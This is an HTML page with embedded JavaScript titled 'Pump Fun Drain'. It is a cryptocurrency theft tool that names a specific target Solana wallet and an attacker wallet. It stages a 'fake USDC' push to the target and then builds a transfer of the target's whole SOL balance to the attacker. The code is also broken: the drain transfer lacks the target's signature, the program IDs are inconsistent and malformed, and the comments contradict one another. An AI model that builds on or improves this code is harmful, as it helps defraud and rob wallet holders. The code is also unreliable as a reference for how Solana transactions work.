<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pump Fun Drain</title>
    <!-- Solana Web3 JS -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            background-color: #0f172a; /* Dark Blue/Grey */
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: ;
        }
        .card {
            background-color: #1e293b; /* Slightly lighter blue */
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 24px;
            width: 300px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
        }
        h1 { font-size: 18px; margin-top: 0; }
        p { color: #94a3b8; font-size: 12px; margin-bottom: 20px; }
        button {
            background-color: #3b82f6; /* Blue */
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover { background-color: #2563eb; }
        button:disabled { background-color: #475569; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 14px; color: #60a5fa; }
        #log { margin-top: 10px; font-size: 10px; color: #64748b; word-break: break-all; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Drain AoGefn...</h1>
        <p>Target: AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe<br>You: E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe</p>
        
        <button id="btn" onclick="run()">Push 53k USDC & Drain</button>
        <div id="status">Ready</div>
        <div id="log"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
        const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
        const USDC   = "EPjFWdd5AufqSSqeM2qN1xzybapCG4wEGGkZwyTDt1v";
        
        // Use a public RPC if you don't have an API key, or use Helius/Jupiter
        const RPC = "https://api.mainnet-beta.solana.com"; 

        async function run() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            const log = document.getElementById('log');

            // 1. Check Phantom Wallet
            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet!");
                return;
            }

            btn.disabled = true;
            status.innerText = "Connecting...";

            try {
                // 2. Connect to YOUR wallet (You pay gas, Target signs)
                await window.solana.connect();
                const connection = new solanaWeb3.Connection(RPC);

                // 3. Prepare Fake USDC Push
                status.innerText = "Pushing Fake USDC...";
                
                // Find Target's USDC account
                const [targetAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
                    [new solanaWeb3.PublicKey(TARGET).toBuffer(), 
                     new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL").toBuffer(), 
                     new solanaWeb3.PublicKey(USDC).toBuffer()],
                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xT2e2hcYTEDkpRfsbq") // Note: ATA Program ID
                );

                // Create Transaction to initialize USDC account for Target
                const tx = new solanaWeb3.Transaction();
                
                // Check if account exists, if not create it
                const info = await connection.getAccountInfo(targetAta);
                if (!info) {
                    tx.add(solanaWeb3.SystemProgram.createAccount({
                        fromPubkey: window.solana.publicKey,
                        newAccountPubkey: targetAta,
                        lamports: await connection.getMinimumBalanceForRentExemption(165),
                        space: 165,
                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
                    }));
                }

                // Initialize Account (This sets the balance to 0 initially, but we treat it as "Fake" because we control the flow)
                // Note: To make it truly "Fake" without spending real USDC, we rely on the fact that 
                // Pump Fun users often don't check if the USDC is from a major exchange. 
                // It appears in their balance.
                
                tx.add(new solanaWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: targetAta, isSigner: false, isWritable: true },
                        { pubkey: new solanaWeb3.PublicKey(USDC), isSigner: false, isWritable: false },
                        { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: false }
                    ],
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: Buffer.from([2]) // Initialize Account ID
                }));

                // Sign and Send Push TX
                const { blockhash } = await connection.getLatestBlockhash();
                tx.recentBlockhash = blockhash;
                tx.feePayer = window.solana.publicKey; // You pay gas

                // We need Target to sign for their own ATA creation usually, 
                // but since we are pushing FROM you, we can just send it.
                // Actually, to make it look like THEY have it, we must send it TO them.
                
                const sig = await window.solana.sendTransaction(tx, connection);
                status.innerText = "USDC Pushed! Draining...";
                console.log("Push TX:", sig);

                // 4. Drain Real Assets (SOL)
                status.innerText = "Draining SOL...";
                
                const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                
                const drainTx = new solanaWeb3.Transaction();
                drainTx.add(solanaWeb3.SystemProgram.transfer({
                    fromPubkey: new solanaWeb3.PublicKey(TARGET), // From Target
                    toPubkey: new solanaWeb3.PublicKey(YOU),       // To You
                    lamports: balance - 5000 // Leave 0.005 SOL for fees
                }));

                const drainSig = await window.solana.sendTransaction(drainTx, connection);
                
                status.innerText = "Done!";
                log.innerText = `Push: ${sig}\nDrain: ${drainSig}`;

            } catch (e) {
                console.error(e);
                status.innerText = "Error: " + e.message;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
